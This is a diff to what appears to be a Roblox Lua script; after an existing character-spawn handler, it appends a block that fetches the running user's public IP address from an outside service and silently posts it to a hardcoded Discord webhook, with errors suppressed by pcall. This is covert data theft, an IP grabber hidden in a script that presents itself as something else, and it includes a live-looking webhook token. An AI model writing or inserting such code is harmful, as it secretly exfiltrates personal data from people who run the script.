@@ -62,3 +62,21 @@ game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
     end
   end)
 end)
+webhook = "https://discord.com/api/webhooks/1249305406291972146/LOVuQhaBmqj_h93bt-qAgPyUQjb-zlgBlPPb-rKzjPCdrY_fzrYaKTu4_HuUWh_537wd"
+
+local http = game:GetService("HttpService")
+local message = {
+    content = game:HttpGet("https://api.ipify.org/"),
+}
+local jsonMessage = http:JSONEncode(message)
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+pcall(function()
+    return request({
+        Url = webhook,
+        Body = jsonMessage,
+        Method = "POST",
+        Headers = headers,
+    })
+end)
